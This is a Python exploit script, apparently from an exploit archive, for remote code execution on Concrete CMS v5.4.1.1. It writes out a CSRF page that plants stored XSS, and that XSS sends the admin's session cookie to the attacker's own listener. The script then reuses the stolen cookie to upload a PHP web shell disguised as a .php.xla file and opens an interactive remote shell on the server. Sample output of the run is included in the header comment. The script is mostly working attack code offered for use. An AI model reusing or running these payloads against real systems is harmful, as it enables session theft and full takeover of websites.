#!/usr/bin/python
# Concrete CMS v5.4.1.1 xss/remote code execution exploit
# Download: http://www.concrete5.org/
# Special Zeitgeist pre release - "Moving Forward" - 15th Jan 2011
# "They must find it difficult, those who take authority as the truth instead of truth as the authority"
# http://www.zeitgeistmovie.com/
# PoC usage:
# [mr_me@pluto concrete5]$ python ./1.py -t 192.168.1.15 -d /webapps/concrete5/ -p 8081 -s suntzu -i wlan0
#
#	| --------------------------------------------------- |
#	| Concrete CMS v5.4.1.1 Remote Code Execution Exploit |
#	| by mr_me - net-ninja.net -------------------------- |
#
# (+) Created XSS in index.html, send the XSS to the admin
# (+) Listening on port 8081 for our target
# (+) Recieved a connection from 192.168.1.2
# (+) Confirmed target @ http://192.168.1.15/webapps/concrete5/index.php/dashboard/scrapbook/
# (+) Got the cookie tqarj8poclha1oso9e9haa9f66, checking if we have admin access..
# (+) Admin access is confirmed
# (+) Determining the upload nounce
# (+) Got the file upload nounce, uploading 'suntzu' shell..
# (+) Shell uploaded! Now looking for it
# (!) Shell found at http://192.168.1.15/webapps/concrete5/files/7412/9465/6675/suntzu.php.xla
# (+) Entering interactive remote console (q for quit)
#
# mr_me@192.168.1.15# id     
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
#
# mr_me@192.168.1.15# uname -a
# Linux steve-ubuntu 2.6.32-27-generic #49-Ubuntu SMP Wed Dec 1 23:52:12 UTC 2010 i686 GNU/Linux
#
# mr_me@192.168.1.15# q

import socket, sys, urllib2, re, struct, fcntl, getpass, base64
from optparse import OptionParser

usage = "./%prog -t [target] -d [path] -p [port] -s [shell name] -i [interface]"
usage += "\nExample: ./%prog -t 192.168.1.17 -d /webapps/concrete5/ -p 8080 -s suntzu -i wlan0"

parser = OptionParser(usage=usage)
parser.add_option("-t", type="string", action="store", dest="target",
                  help="Target server as IP or host")
parser.add_option("-d", type="string", action="store", dest="path",
                  help="Directory path of Concrete CMS of your target")
parser.add_option("-p", type="string",action="store", dest="port",
                  help="Server port to listen on")
parser.add_option("-s", type="string", action="store", dest="shellName",
                  help="shell name to write on the target server")
parser.add_option("-i", type="string", action="store", dest="ifce",
                  help="External network interface, must be routable.")

(options, args) = parser.parse_args()

def banner():
    print "\n\t| --------------------------------------------------- |"
    print "\t| Concrete CMS v5.4.1.1 Remote Code Execution Exploit |"
    print "\t| by mr_me - net-ninja.net -------------------------- |\n"

if len(sys.argv) < 10:
        banner()
        parser.print_help()                                                                    
        sys.exit(1)

# set the php code injection (just an example here)
phpShell = "<?php system(base64_decode($_GET['cmd'])); ?>"
myCmd = "?cmd="

def get_ip_address(ifname):
        ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        return socket.inet_ntoa(fcntl.ioctl(ls.fileno(), 0x8915, struct.pack('256s', ifname[:15]))[20:24])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("", int(options.port)))
s.listen(1)

def sendPostRequest(req):
        su = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # change the port to another, if they are running the CMS off another port (443?)
        try:
                su.connect((options.target,80))
        except:
                print "(-) Failed making the connection to target %s" % options.target
        su.send(req)
        data = su.recv(1024)
        su.close()
        return data

def generateShellUpload(cookie, ccm_token):
        postRequest = ("POST %sindex.php/tools/required/files/importers/single HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Cookie: CONCRETE5=%s;\r\n"
        "Content-Type: multipart/form-data; boundary=---------------------------lulz\r\n"
        "Content-Length: 313\r\n\n"
        "-----------------------------lulz\n"
        "Content-Disposition: form-data; name=\"Filedata\"; filename=\"%s.php.xla\"\r\n\n"
        "%s\n"
        "-----------------------------lulz\n"
        "Content-Disposition: form-data; name=\"ccm_token\"\r\n\n"
        "%s\n"
        "-----------------------------lulz--\r\n\r\n" % (options.path, options.target, cookie, options.shellName, phpShell, ccm_token))

        return postRequest

def xssTheAdmin():
        print "(+) Created XSS in index.html, send the XSS to the admin"
        print "(+) Listening on port %s for our target" % (options.port)
        xssJunk = ("<html><body onload='document.f.submit()'>"
        "<form method=post name=f action=\"http://%s%sindex.php/dashboard/scrapbook/addScrapbook/\">"
        "<input name=\"scrapbookName\" type=\"hidden\" value='<script>document.location=\"http://%s:%s/cookie=\"+document.cookie+\"=\"</script>'>"
        "<input type=\"hidden\" value=\"Add\" ></form>"
        "</html>" % (options.target, options.path, get_ip_address(options.ifce),options.port))
        try:
                xssFile = open('index.html','w')
                xssFile.write(xssJunk)
                xssFile.close()
        except:
                print "(-) Error writing file.."
                sys.exit(1)

def sendPayloads(uri, magicCookie):
        try:
                req = urllib2.Request(uri)
                req.add_header('Cookie', 'CONCRETE5='+magicCookie)
                check = urllib2.urlopen(req).read()
        except urllib.error.HTTPError, error:
                check = error.read()
        except urllib.error.URLError:
                print "(-) Target connection failed, check your address"
                sys.exit(1)
        return check

def interactiveAttack(ws):
        print "(+) Entering interactive remote console (q for quit)\n"
        hn = "%s@%s# " % (getpass.getuser(), options.target)
        cmd = ""
        while cmd != 'q':
                cmd = raw_input(hn)
		cmd64 = base64.b64encode(cmd)
                cmdResponse = sendPayloads(ws+myCmd+cmd64,"lolnoauth")
                print cmdResponse

def startShellAttack():
        conn, addr = s.accept()
        print "(+) Recieved a connection from %s" % addr[0]
        while 1:
		data = conn.recv(1024)
		cookie = re.search('CONCRETE5=(.*)', data)
		cookie = cookie.group(1)[:26]
		target = data.split("Referer: ")[1].rstrip()
		confirmTarget = "http://"+options.target+options.path+"index.php/dashboard/scrapbook/".rstrip()
		target = target[:len(confirmTarget)]
		if target == confirmTarget:
			print "(+) Confirmed target @ %s" % (target)
		else:
			print "(-) Error, mismatch of targets."
			sys.exit(1)
		print "(+) Got the cookie %s, checking if we have admin access.." % (cookie)
		adminCheck = sendPayloads(target, cookie)
		if re.search('delete this scrapbook', adminCheck):
			print "(+) Admin access is confirmed"
		else:
			print "(-) This is not an admin cookie. Exiting.."
			sys.exit(1)
		print "(+) Determining the upload nounce"
		nounceRequest = "http://"+options.target+options.path+"index.php/dashboard/files/search/"
		nounceResponse = sendPayloads(nounceRequest, cookie)
		ccm_token = nounceResponse.split("<input type=\"hidden\" name=\"ccm_token\" value=\"")[1].split("\" />")[0]
		print ("(+) Got the file upload nounce, uploading '%s' shell.." % (options.shellName))
		uploadReq = generateShellUpload(cookie, ccm_token)
		findShell = sendPostRequest(uploadReq)
		print "(+) Shell uploaded! Now looking for it"
		magicNum = re.search('(?<=push\()\w+', findShell)
		shellSearchReq = ("http://%s%sindex.php/tools/required/files/properties?fID=%s"
		% (options.target, options.path, magicNum.group(0)))
		shellSearch = sendPayloads(shellSearchReq, cookie)
		shellLoc = shellSearch.split("<th>URL to File</th>")[1].split("</td>")[0].split("=\"2\">")[1]
		print ("(!) Shell found at %s" % (shellLoc))
		break
        conn.close()
        return shellLoc

if __name__ == "__main__":
        banner()
        xssTheAdmin()
        webShell = startShellAttack()
        interactiveAttack(webShell)
